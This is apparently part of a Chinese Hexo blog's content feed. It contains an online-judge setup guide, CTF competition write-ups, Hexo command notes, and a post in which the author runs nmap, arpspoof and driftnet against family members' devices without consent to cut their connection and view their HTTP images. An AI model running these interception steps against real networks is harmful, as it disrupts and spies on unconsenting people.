abc256f90b4a3d5a6cdcda36934f3fa9cdc8d9f4512d69c4e5919082d1a17537e03983ce698d5307de09551ef09cbbdcdcb2785908d9bba354750698b8baa58fdfd1b2d934593a6e1532907a44651b2e1dc17d0fba2c52f7a671c536b4a956d6488678e820849c31a054cd06822de7331d055b12ec1c4e1de36715d77a42baec60a6d00bc94c1b82a2376b432804f4c40c19d228c50e6743d53760191ac800623b03049287b2887927cb774d271fd5fe73fd41b01c0ea30e05c7530e4e5001371730731c1b8309f211f77efcc3dbd27ca946f4111d81c5266b1b5b25ef06f4b66f1c855f745c09313889546d9511cc8232394713f3a4d7e5e5494469e107859f1f70fabff510900375166fcf035dffafc8189ef5ec386251e484894275052ffaf94ba29d8df1c47ae9a0f586dc51e46bfe16aea93489dbfa8fc2f057ca3bdb21fb69e103e4d7af21183dad86f5fb23e6451c9869664ef4e331bd1a0c77bfb846fe53076c0a096b31917cea278ab9ca990de9d35675994bc934ed673b64060d144019b62e803e109bb90b2f6f4cb4aad79c7e5eb3eeff05748edffdd1e90432195a2503f483884b87390d28b100655dc71ce8bb20df7bf8ba54d01d500bbb1ee266de71849d49dad8ac33896120c42680df79e78e1030e013459aa882abb51dda5a6a9b906effc7f62ca27fb1dec95f9092893f023272fe1204b6d568c7f19805dea31bbea036558aa7567d6418eaedf323542c857dc30f87ef0a7b556acf4cc18e4fe0a453d65fefcb89b81b5fabccd77a767401108d5cf03b6b91d964542f8cad0c7008a9a0bd18f50764486d0e231907e379850449b498dbdfcae8176c18f59aaea208365e19be598b452c183708b0f4d7372b7125a3a0078e032ea5be98ce72276780d3aca073dfa57d518e32b78475a90c734688527000b7d4a53df8ed376781c7b0db300e6d4383871af43eb2d9326c46aa634da6c02341f42d4591fc03a97a08cf46b8009f79873e9cd900d019a75c91443aec45706f8d85120c8d298e11495f8f5131eeaa6038e3f7af02061f73fb88ef23f2293ff2e7412be47e29a37c9b8b4a9e7e217442c5f536a323d601cef357cebdf4b805888ac7a9f5280f1d38b5f27d19434d964516e2b4992561d8b5e23a2307a4ca208443f5981d5977001f0652c15f8a4f5e1e14135d746408364180772397ad994dd8ff6112475f6fcd2dd4579f7e2bb0c6b769d5342b3c004b73bc33cdd0708506de14927f1982122f51926e73c1f2eaf673a66b381022e4070fd5685db9ed88907ca0924bb6459e2bf5034750f7e4d8a27a91d59368bbe1dba02e5e92073dc0ce46627d8e66a769b4815ea54d112c74221d5f531ef3e96857e0ab35999a39dd069ef119a65dea92d70f3018bf92499003bff9ef5d4689bacedf65b357543ad7c3c5bf8368d31fc9e3ead6b1be710de7bfcdc26c95bdc3a1551e52b984c4d98f70d07f5e07ebb2ef6ead9365d878155d39af54030bc3f4dd57156324d7666f3260882adcd97c11417dd8ce243a8b082743900d6b2190f518040329bba872075e221dfe0741c9c67c11a88957b8ed60e2270893eb40b53efc923c27a642427533098913d59596ddd0ea96cd47596714d79351b41e4037fc46d82877880c3cb6effd65af5ee57ba7d69e9a77426d427c41ad2fdebe0a37c6a543fa0aa2c507ff633fd685c2954a5fcb2d35ac7b5934df693d3c385b9017d25a2820774205dc3a44fd24193985b1bad4bb25449698231d3d329fd95e7d9a410abbe0b6cb3eb5111e60a10012badf1f130088f61213c0a9c9981a13fb1bc7aefd29eb0b78c141e9887f9ab1cfe66c086e80e5105f9348ce21593243f1eed75db00d6717f1d085ee5a2a40db78e4c43cc1fcedb3ce8b7fae3790cde563c847b63c7a254e237cbbed27761f36d4a4f22eaa8f5a8ee2cb44ecb9090ea6e9edcc1e1a64e29276b707a39af4944ec24a6c9b70f84921efc6d1c55e193e1f3867cfe627b40948fdc8cf4ec00abae56931b33f7fa0069179c3fcdeca08d9f4ef84792b9b68efd4dab7280b245c9484e55c3c6d6dc4a9fde3c1fb1191bba2725769d182919a77a1beb0c3497a481315084b1a49aecf71757ac875b5f3fc797a49181c78babb7d3af9758fb7c73ee9ba168ee262247c1529b4337f07f2831198c5c99ed6a2df12a7a9acf230b4ffe185d9fdcff3e455e4ec1792f3f21dac0f824bc1c40b0c8e04ee96998d6450c5a94a9b4feec6ab8a2cf3bfe6efa1fa18b895272c8786357296cf8a5009e0735cfd293448096831c3596998ded128693ffc7048e448e24df5e017232f0d53af5c40da42cc77cf63d032e3ed2c84476dac3483517e9112a37cf0502c4b456bb3030124eed911cf0b301ebb01704e5b72656cf97db697321dc73e666d6b14917c1be378571be9d06c6be22da1de3b5e8efcffed90b3bf41e0121772a73358762b553abea632aa693df5bb9b997a0f68458ac436b72ef8e4a71e69f94fa4e7f3dd65e236465933a56fcd25947844697039c9f8342c25fe21b798453ace6b18af148ffad65fa08e9f37d11fa9e4922dc400b7cceb8b87fa934010a8e8ff352ea5ae7867028a113085f37a96f60b6346586a23dfdd942597461b44ef6b55809dda089d16c5aa10f0866c89b8157624c7ca455fd1725c46d2626ebaf6177c545ef05cd1991361fa7ca66b951ffa348c23c58ae93d195a478aa8d7c828ac3d627b762938060462bc21da9bf03900c4860913a761b6f7495fbf04892a9adc2df61b22655b407bda52d4bc5b843c66a67ef35545f72a2c0e60a6e44032d33368a7d8ba47a66947fa220e667be6f9df8060af4a895b2159ac4cc67c283885ee121568b532bb9cad036b6685ad1b2cf4cdcbd2a0a659d2aabfcb01bee015c40fb72f236335247b7d2b65d9bc076dba19f7e7f214389850e6ef799bf831bc7f55f7dc56d9adbb7585a634b16697a135f3c7b5fc15eb6a55630a6dcbf6a89e47990e834d87227a027c18b09b12552a3153f47e4d7b1e11c1fefeb9be6d322d3ef0a46ed7bae76b8c18030216b9a3be9cd7069c6c7afe06ad1f63243d7e4a4012c4d116182c5cf3b4ec7a29bff4a1e22bcf4bfd30bba2814627d44fe4d798c0ca98d66b014e99fcae30cb1ab9332476a21c653ac28090d112a67b413eb5cd8b8b5b4654826ae0e5f0aede9e1d1b2d5ac8a02a20436d4d8fd540f76a7480bbabddd6ea1c980687c56deda1fc7de289564e787bd9987a1838af443d574052e19f80b2b4b345fbe8d9daa3c34ab35d4ce9e5b62a4d139bf68d9faf2745199e07054931f9a2742dd22fe3603fe40a3262605832b0816620177b8c15b0cd61dc2618464529bd28953b4371f81f2376921a0d0556b9e7cafc95af1f88285690bdd30893394b96fdb600ac2ddec3efecdd21fac21dbc21c4492f27b6ff6cbee27a4564b6cc6e9cd1effed6d319e947370b5d9b0ff1d865ef8dc875d212a14d03bf4d4e9e1926c441a8276fef1bf39a90dce15f8a3e1ef20656d9e166f0be233b6f191ec531db5b707b00aedce2993cfb92f2f980069d6efae14641d0ac1896b81a31836ab7e0cb66bfccbf2d6a4711d3135317c26c280dca0c55f963cae9fe9d8a9825d147df84f8228c4445ecabfdebb9313ffad76dd3d0099779ff3fc68eabab4fb213a64c0b1d1e5d511b3bce88f68241d4597f3d12a2648ed656292a9042bb2f31508176a756ec7a41e4412395a6b6ffd69e0ee5ce561cd09ee3012d216ee2f1e9890fe8e6a77afeedf412825ae3a584c8bdd13a1c96f81b881df1f5e97f10ebabd05671f80dfd5d23f795930c7d1b8603cc3943d250fca86fb6e20e1dbcf7b24c08f167589bb4da2fdf45df235ce011c419dea4f19c7f47b42e0892d153d64654bf5d83e1f2a82e5a19a653992e3befc590b960eeba20f5871fff1d25aab96e5013d94ab4a1536e8744ec7a8c74a956de3a516cf0dd940c15f3bbd25563f273cf32aa0b5384938318f1ad338a9f476a7e1e8e118903afded0f6341b0b0fe7b119b48ad4af4685c88eaa50fb86c44e4d19a425e38fd3a94c78765c9185ce1b4b26204982fcabb03b80b74b2b46ecfd281d8dde37c122571b1c84a0198a287e2fc87a5cbfd9aa1e183bd60a19495a7d946183e425eca0f490752b66f290df97e3573ac96d666dd78359dcb9fe95dc59c0d8817a268f2d87228f67a062c57859984a045d7fb67b9154cbea412cb4641fadb488f74baaf1b9e5e7c84fba0e8642ae3fbb1c039e30b4718178dc92b4e5177dbf65635b84184ca1f6907bbb1f36b0acc14a8c511af061ba4a0ec7525076a8046fdeb99eef399967228764ea8da5ac6eaef6aa005273d17d72a91e237a7fa2603f97fa98a8e5a2eda8f4f3c1a6a45271ffabf6732d178b5a8eb446c9d86ce797c7d659d5d7fc68152a29c8af31abafd8a9c1f27e0696f5f79b76ca08f48153e50007ed0a336c449fdac14aa25b645afa611f2f0fd0298a4537cd6dd5a06ef4048e08dac8f853e93770fa13f8d0d6597575ffe42c64351cc722ca73fbd249aa02552c4b48bac891fbef53c375afe890df964658076e6553a70d05a054ca35e10fcec2eaaf30739e018bdc70744784f95f6cac6f73f239d134868172279f6ddd5d6f87ecb3007caec14dd3bef45acb44cab1428d02df3c231747c5f7bb84f42eaea42e11e0de08f9731f4eacac2e1803e7917d356d384f6dad898cf9997c8141ea0fb4c695dae3d40e900b28c5d8d834e8e7cf8f4e74973a0b21d07356f3f274106c8e32bf72d1e69a432d42d761e364f9dba5a988d5048b3c68ce33a4a1ebe55c7aa1169ef3662937eff7ed177c61211a06d00c480e54e1c453c126f39faaa107b9e11200dac6c6049ecb7baa5185d8e76db827635e034c06a50ce727f0a8c4cd515ba0618174e5a9478d513122093fa251071239cfce1db67088fc36b638d1a4e3ae4ddcf24e475ff8ae56768ea33cb202ec2c065084e382cf917cdba2bbaba46c8b70937b8e97dd21c45ae1b2fb65b90d2f6b678222104827e9e9492c604c3b0a3098bd3847163b517eba2dec1a62ea3f94db01346d0a1fcbd3e2ca401a17b032cdaed9242efe7592330cb3ae41138d300779306abdf61b8be42c42f6138e9655b1fb1fb0c9a80b38ac334a737e8f2ee47f52e9eecd44f1100eb13be73d88a31a4e455059db638e4fbd1736a67414c8bb61ba290abed4f5b1af453492ae8dfb5dd6e100faa2fd440c43b9986a5d4cbf02b9ba7e1402220a65bfc0beafc87d31cfcf3f25af6c2ba34e503d3c517bb233b318d93749951ad590fabb211e1c6b7fa2c766ce5d2e419bf1ec49833194f000528ecb2d1f7082f08b65149594ae2a571a</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-xray">
      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Hey, password is required here.</span>
      </label>
      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">
        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>
        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>
      </svg>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>利用OJ搭建C语言比赛平台</title>
    <url>/2022/06/09/%E5%88%A9%E7%94%A8oj%E6%90%AD%E5%BB%BAC%E8%AF%AD%E8%A8%80%E8%80%83%E6%A0%B8/</url>
    <content><![CDATA[<p>下一届实验室的C语言考核平台的搭建</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241648267.png?x-oss-process=hzy" alt="imageabdeef81597754c7.png"></p>
<span id="more"></span>
<h1 id="安装依赖环境">安装依赖环境</h1>
<p>ubuntu系统用户：</p>
<pre><code class="hljs shell">sudo apt-get update &amp;&amp; sudo apt-get install -y vim python-pip curl git
pip install docker-compose</code></pre>
<p>centos系统用户：</p>
<pre><code class="hljs shell">yum update &amp;&amp; yum install -y vim python-pip curl git
pip install docker-compose</code></pre>
<h1 id="安装docker">安装docker</h1>
<pre><code class="hljs plaintext">sudo curl -sSL https://get.daocloud.io/docker | sh</code></pre>
<h1 id="安装oj">安装OJ</h1>
<h2 id="克隆源码">克隆源码</h2>
<pre><code class="hljs plaintext">git clone -b 2.0 https://github.com/QingdaoU/OnlineJudgeDeploy.git &amp;&amp; cd OnlineJudgeDeploy</code></pre>
<h2 id="启动docker">启动docker</h2>
<pre><code class="hljs plaintext">docker-compose up -d    // ROOT</code></pre>
<h1 id="可能遇到的问题">可能遇到的问题</h1>
<h2 id="问题一">问题一</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241648185.png?x-oss-process=hzy" alt="image8c7a4b216534400c.png"></p>
<p>错误出现的原因是，之前启动的 <a href="https://so.csdn.net/so/search?q=docker&amp;spm=1001.2101.3001.7020">docker</a>-compose 没有关闭。</p>
<h2 id="解决方法">解决方法</h2>
<p>先把之前的 docker-compose 关闭</p>
<pre><code class="hljs python">docker-compose down
<span class="hljs-number">1</span></code></pre>
<p>之后再执行</p>
<pre><code class="hljs python">docker-compose up</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241648356.png?x-oss-process=hzy" alt="imagec72cd8d7a675f2e2.png"></p>
<h2 id="问题二">问题二</h2>
<p>一般情况默认端口都是80和443，但是这两个端口一般都是占用过了，所以需要修改</p>
<h2 id="解决办法">解决办法</h2>
<pre><code class="hljs plaintext">vim docker-compose.yml</code></pre>
<p>最下面的端口改一下</p>
<h1 id="出题方法">出题方法</h1>
<p><a href="https://blog.csdn.net/qq_43516113/article/details/101517639">关于oj导入题库简单介绍</a></p>
<h1 id="至此ctf和c语言的考核平台都搭建完成了">至此CTF和C语言的考核平台都搭建完成了</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241648026.png?x-oss-process=hzy" alt="imaged09d0ae16b493475.png"></p>
]]></content>
      <categories>
        <category>漏洞测试环境搭建</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ARP欺骗</title>
    <url>/2022/07/20/%E5%B1%80%E5%9F%9F%E7%BD%91%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p><img src="http://img.hzy2003628.top/202207201235661.jpeg" alt></p>
<span id="more"></span>
<p>今天无聊，搞着玩，对家里边其他人的设备来个DNS劫持和arp欺骗，别说，还挺好玩</p>
<h1 id="arp欺骗">arp欺骗</h1>
<h2 id="原理">原理</h2>
<h3 id="arp协议">ARP协议</h3>
<p>在局域网中，网络中实际传输的是“帧”，帧里面是有目标主机的MAC地址的。在以太网中，一个主机要和另一个主机进行直接通信，必须要知道目标主机的MAC地址。MAC地址就是ARP协议获得的。其实就是主机在发送帧前将目标IP地址转换成目标MAC地址的过程。ARP协议的基本功能就是通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的顺利进行。所以说从某种意义上讲ARP协议是工作在更低于IP协议的协议层。这也是为什么ARP欺骗更能够让人在神不知鬼不觉的情况下出现网络故障，危害会很隐蔽。</p>
<h3 id="arp欺骗原理">ARP欺骗原理</h3>
<p>ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。</p>
<p>当局域网中一台机器，反复向其他机器，特别是向网关，发送这样无效假冒的ARP应答信息包时，严重的网络堵塞就会开始。由于网关MAC地址错误，所以从网络中计算机发来的数据无法正常发到网关，自然无法正常上网。这就造成了无法访问外网的问题，由于很多时候网关还控制着我们的局域网WLAN上网，所以这时我们的WLAN访问也就出现问题了。</p>
<h2 id="最终目标">最终目标</h2>
<p>此次测试是在局域网中进行，使用kali和Windows10物理机测试。最终效果是利用kali干扰物理机不能正常上网。</p>
<h2 id="使用工具">使用工具</h2>
<p><strong>arpspoof</strong>命令进行arp欺骗</p>
<blockquote>
<p>ps:注意要使用网络桥接模式，选择之后连不上网多半是因为网卡选错了</p>
</blockquote>
<h2 id="步骤">步骤</h2>
<p>下面开搞</p>
<p>首先先查看kali网卡ech0的一些基本情况</p>
<pre><code class="hljs plaintext">ifconfig</code></pre>
<p>然后查看被攻击主机的网关情况</p>
<pre><code class="hljs plaintext">ipconfig</code></pre>
<p>在这里有必要说一下，两者都是在一个局域网下，其网关地址是一样的，只是ip地址略有不同而已，不出意外基本都是192.168.1.1，在kali里看到的<code>broadcast 192.168.1.255</code>的意思就是当前网关为192.168.1.1</p>
<p>基本情况了解完了，接下来上神器–nmap，使用它扫描局域网下其他主机的ip地址</p>
<pre><code class="hljs plaintext">nmap 192.168.1.1-100</code></pre>
<p>结果如下</p>
<p><img src="http://img.hzy2003628.top/202207201103930.png" alt="image-20220720110345290"></p>
<p>也可以使用fping进行探测</p>
<pre><code class="hljs plaintext">fping -asg 192.168.1.1/24</code></pre>
<p>也有直接命令查询当前网关</p>
<pre><code class="hljs plaintext">cat /etc/resolv.conf</code></pre>
<p>在这里我扫到了四台设备，一台路由器，两部手机和一台电脑，不对，发现少了，区间扩大，1-200走起来，最后直接全扫一下得了，都扫出来完了，三部手机，一台路由器，88端口应该是连的电视吧，不要问，咱的目标是搞家里边其他人设备</p>
<pre><code class="hljs plaintext">nmap -sn 192.168.1.*</code></pre>
<p><img src="http://img.hzy2003628.top/202207201111323.png" alt="image-20220720111103262"></p>
<p>下面就可以随机挑一名幸运观众开始操作了</p>
<pre><code class="hljs plaintext">arpspoof   -i   网卡   -t    目标IP    网关
arpspoof -i eth0 -t 192.168.1.172 192.168.1.1</code></pre>
<p>这个时候目标主机就上不了网啦，但是貌似只是浏览器不能上网，qq微信这样的貌似还是可以</p>
<p><img src="http://img.hzy2003628.top/202207201129043.png" alt="image-20220720112859952"></p>
<p>不仅如此，对于访问的是HTTP协议下的页面，还可以转发他所看到的图片</p>
<pre><code class="hljs plaintext">echo 1 &gt; /proc/sys/net/ipv4/ip_forward   (1代表可以转发)
cat  /proc/sys/net/ipv4/ip_forward</code></pre>
<pre><code class="hljs plaintext">arpspoof -i eth0 -t 192.168.1.1 192.168.1.100   //前者是要查看的网关  后者是要查看的设备ip</code></pre>
<pre><code class="hljs plaintext">druftnet -i eth0  //弹出来的框里就会呈现出来他那台设备所看到的HTTP协议下的图片</code></pre>
<p><img src="http://img.hzy2003628.top/202207201150100.png" alt="image-20220720115047994"></p>
<p>这就是ARP欺骗所有的步骤和原理</p>
<blockquote>
<p>在网上看到这个区别感觉值得记一下</p>
<p>HTTP和HTTPS的区别：</p>
<p>HTTP是一种发布和接收 HTML 页面的方法，被用于在 Web 浏览器和网站服务器之间传递信息。<br>
HTTP 协议以明文方式发送内容，不提供任何方式的数据加密，如果攻击者截取了Web浏览器和网站服务器之间的传输报文，就可以直接读懂其中的信息。<br>
HTTPS 经由 HTTP 进行通信，但利用 SSL/TLS 来加密数据包。HTTPS 开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。<br>
HTTPS（SSL+HTTP） 数据传输过程是加密的，安全性较好。</p>
</blockquote>
]]></content>
      <categories>
        <category>局域网攻击</category>
      </categories>
      <tags>
        <tag>局域网攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>山石2022冬令营结营赛</title>
    <url>/2023/01/18/%E5%B1%B1%E7%9F%B32022%E5%86%AC%E4%BB%A4%E8%90%A5/</url>
    <content><![CDATA[<p>山石2022冬令营结营赛</p>
<span id="more"></span>
<h1 id="前言">前言</h1>
<p>第一次参加CTF冬令营，师傅们讲的都很好，也学到了不少东西，结营赛没想到WEB都是0解，题目质量很高，只能在其他方向上拿点分了，最终排名第四，继续加油吧，距离大佬还差的很远</p>
<h1 id="签到题">签到题</h1>
<p>关注公众号发送签到题得到flag</p>
<p>hsnctf{welcome_to_hsnctf}</p>
<h1 id="daobudao">daobudao</h1>
<p>base64解码得到kvqfwi{j00g_oxfn_kdyh_ixq}</p>
<p>凯撒解密，得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image001.png?x-oss-process=hzy" alt="img"></p>
<p>hsnctf{g00d_luck_have_fun}</p>
<h1 id="s7_analysis">S7_analysis</h1>
<p>0x29 - PLC Stop，查询得到两组数据</p>
<p>s7comm.param.func == 0x29</p>
<pre><code class="hljs plaintext">399 269.522771   192.168.1.103 95.182.246.171    S7COMM    87  ROSCTR:[Job   ] Function:[PLC Stop]</code></pre>
<p>得到编号399，所以得到flag</p>
<p>hsnctf{399}</p>
<h1 id="外星电波~">外星电波~</h1>
<p>首先文件内容是base64，python脚本转一下发现是pk头</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230201162518536.png?x-oss-process=hzy" alt="image-20230201162518536"></p>
<p>保存为pk文件</p>
<pre><code class="hljs plaintext">import base64

with open(&quot;./flag.txt&quot;, &quot;r&quot;) as f:

  data = base64.b64decode(f.read())

  #print(data)

  file = open(&quot;flag.zip&quot;, &quot;wb&quot;)

  file.write(data)</code></pre>
<p>发现需要密码</p>
<p>然后使用ntfs隐写解密得到wav音频</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230201162526964.png?x-oss-process=hzy" alt="image-20230201162526964"></p>
<p>然后sstv隐写得到压缩包密码passwd@hillstone</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230201162535190.png?x-oss-process=hzy" alt="image-20230201162535190"></p>
<p>解压得到flag</p>
<p>hsnctf{70995fb0-eb60-0787-f305-77066aeb6730}</p>
<h1 id="extract">extract</h1>
<p>看文件附件就是提示Cloakify，然后去github下载工具进行解密</p>
<p><a href="https://github.com/TryCatchHCF/Cloakify/blob/master/cloakifyFactory.py">https://github.com/TryCatchHCF/Cloakify/blob/master/cloakifyFactory.py</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230201162543553.png?x-oss-process=hzy" alt="image-20230201162543553"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230201162551060.png?x-oss-process=hzy" alt="image-20230201162551060"></p>
<p>得到flag文件是压缩包</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image015.png?x-oss-process=hzy" alt="img"></p>
<p>解压发现是套娃，解压2332次左右就会得到flag文件</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230201162608479.png?x-oss-process=hzy" alt="image-20230201162608479"></p>
<p>脚本如下</p>
<pre><code class="hljs plaintext">import zipfile

import re

zipname = &quot;C:\\Users\\25963\\Desktop\\flag\\&quot;+&quot;f2332.zip&quot;

while True:

  if zipname != &quot;C:\\Users\\25963\\Desktop\\flag\\flag.txt&quot;:

​    ts1 = zipfile.ZipFile(zipname)

​    print (ts1.namelist()[0])

​    res = re.search(&#x27;[0-9]*&#x27;,ts1.namelist()[0])

​    print (res.group())

​    passwd = res.group()

​    ts1.extractall(&quot;C:\\Users\\25963\\Desktop\\flag\\&quot;,pwd=passwd)

​    zipname = &quot;C:\\Users\\25963\\Desktop\\flag\\&quot;+ts1.namelist()[0]

  else:

​    print (&quot;find&quot;)</code></pre>
<p>得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230201162619972.png?x-oss-process=hzy" alt="image-20230201162619972"></p>
<p>hsnctf{66eec912-e9ce-4e1d-ac54-ecea075dcb96}</p>
<h1 id="re_easy">re_easy</h1>
<p>查壳</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230201162630665.png?x-oss-process=hzy" alt="image-20230201162630665"></p>
<p>Upx先用upx shell脱壳</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230201162639573.png?x-oss-process=hzy" alt="image-20230201162639573"></p>
<p>寻找到数据</p>
<pre><code class="hljs plaintext">7,127,121,92,110,67,101,84,3,71,4,82,122,111,121,2,5,71,117,2,109,99,101,71,3,100,113,77</code></pre>
<p>脚本如下</p>
<pre><code class="hljs plaintext">s=[7,127,121,92,110,67,101,84,3,71,4,82,122,111,121,2,5,71,117,2,109,99,101,71,3,100,113,77]
print(&#x27;&#x27;.join(chr(c^55)for c in s))</code></pre>
<p>得到</p>
<p>0HNkYtRc4p3eMXN52pB5ZTRp4SFz</p>
<p>Ida打开可以得到base64码表，解码得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image023.jpg?x-oss-process=hzy" alt="img"></p>
<p>hsnctf{7h1s_s0_e4sy}</p>
<h1 id="babypy">Babypy</h1>
<p>脚本如下</p>
<pre><code class="hljs plaintext">import random
 from Crypto.Util.number import long_to_bytes
 from Crypto.Cipher import AES
 ans0 = b&#x27;\xa2\xeb\xbb\n9\xb70\xc8G\x84h\xd9\xd0\xf1\xf9\x13/_\xa7\xe4f\xbeN\xfaw.i\x067\xd1\x02^&#x27;
 random.seed(12648430)
 shuf1 = [i for i in range(32)]
 random.shuffle(shuf1)
 shuf2 = [i for i in range(32)]
 random.shuffle(shuf2)
 a = []
 b = []
 for _ in range(32):
   a.append(random.randint(0, 255))
   b.append(random.randint(0, 255))
 shuf3 = [i for i in range(32)]
 random.shuffle(shuf3)
 key = long_to_bytes(random.getrandbits(256))
 aes = AES.new(key, AES.MODE_ECB)
 ans1 = aes.decrypt(ans0)
 ans1 = list(ans1)
 ans2 = [0 for _ in range(32)]
 for i in range(32):
   ans2[shuf3[i]] = ans1[i]
 for i in range(32):
   ans2[shuf2[i]] ^= a[i] ^ b[i]
 ans3 = [0 for _ in range(32)]
 for i in range(32):
   ans3[shuf1[i]] = ans2[i]
 print(ans3)</code></pre>
<p>得到104, 115, 110, 99, 116, 102, 123, 82, 52, 110, 100, 111, 109, 95, 113, 117, 49, 116, 101, 95, 105, 110, 116, 51, 114, 101, 115, 116, 105, 110, 57, 125</p>
<p>十进制转Hex转str得到flag（ps:手搓的）</p>
<p>hsnctf{R4ndom_qu1te_int3restin9}</p>
<h1 id="hsandroid1">HSAndroid1</h1>
<p>首先反编译apk</p>
<p>找到主函数进行分析，找到S和·Key</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image025.jpg?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image027.jpg?x-oss-process=hzy" alt="img"></p>
<p>主体逻辑如上，先进行aes解迷然后进行base64解码即可得到flag</p>
<p>代码如下</p>
<pre><code class="hljs plaintext">from Crypto.Cipher import *
s= &quot;HyKsaPpqT4l436tHiSEXtIlLgVV4GE7mGc2WoI0KlP2YhKFco7OPcJYtS58BFwDq&quot;
key=[12, 32, 13, 14, 23, 108, 31, 108, 44, 121, 42, 121, 42, 113, 41, 124]
key=&#x27;&#x27;.join(map(chr,key))
iv=[12, 32, 13, 14, 23, 108, 31, 108, 44, 121, 42, 121, 42, 113, 41, 124]
iv = &#x27;&#x27;.join(map(chr,iv))
obj = AES.new(key,AES.MODE_CBC,iv)
obj.decrypt(s.decode(&#x27;base64&#x27;))
#&#x27;hsnctf&#123;android_is_not_e4sy_will_caref1ul&#125;\x07\x07\x07\x07\x07\x07\x07&#x27;</code></pre>
<p>得到flag</p>
<p><em>hsnctf{android_is_not_e4sy_will_caref1ul}</em></p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>博客制作遇到的问题</title>
    <url>/2022/01/11/%E5%8D%9A%E5%AE%A2%E5%88%B6%E4%BD%9C%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>制作博客的过程中遇到的一部分问题及其解决办法</p>
<span id="more"></span>
<h1 id="常用指令">常用指令</h1>
<pre><code class="hljs plaintext">---
title: 基于Hexo的hexo-theme-matery主题搭建博客并优化
date: 2019-10-03 14:25:00
author: xx
img: /source/images/xxx.jpg
top: true
cover: true
coverImg: /images/1.jpg
password: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92
toc: false
mathjax: false
summary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要
categories: 工具
tags:
  - blog
  - hexo
---</code></pre>
<p><code>hexo server</code> #启动本地服务器，用于预览主题。Hexo 会监视文件变动并自动更新，除修改站点配置文件外,无须重启服务器,直接刷新网页即可生效。</p>
<p><code>hexo server -s</code> #以静态模式启动</p>
<p><code>hexo server -p 5000</code> #更改访问端口 (默认端口为4000，'ctrl + c’关闭server)</p>
<p><code>hexo server -i IP地址</code> #自定义 IP</p>
<p><code>hexo clean</code> #清除缓存 ,网页正常情况下可以忽略此条命令,执行该指令后,会删掉站点根目录下的public文件夹</p>
<p><code>hexo g</code> #生成静态网页 (执行 $ <code>hexo g</code>后会在站点根目录下生成public文件夹, hexo会将&quot;/blog/source/&quot; 下面的.md后缀的文件编译为.html后缀的文件,存放在&quot;/blog/public/ &quot; 路径下)</p>
<p><code>hexo d</code> #自动生成网站静态文件，并将本地数据部署到设定的仓库(如github)</p>
<p><code>hexo init</code> 文件夹名称 #初始化XX文件夹名称</p>
<p><code>npm update hexo -g</code>#升级</p>
<p><code>npm install hexo -g</code> #安装</p>
<p><code>node-v</code> #查看node.js版本号</p>
<p><code>npm -v</code> #查看npm版本号</p>
<p><code>git --version</code> #查看git版本号</p>
<p><code>hexo -v</code> #查看hexo版本号</p>
<h1 id="简写指令">简写指令</h1>
<p>hexo n &quot;我的第一篇文章&quot;<code>等价于</code>hexo new &quot;我的第一篇文章&quot;<code>还等价于</code>hexo new post “我的第一篇文章”<br>
hexo p<code>等价于</code>hexo publish<br>
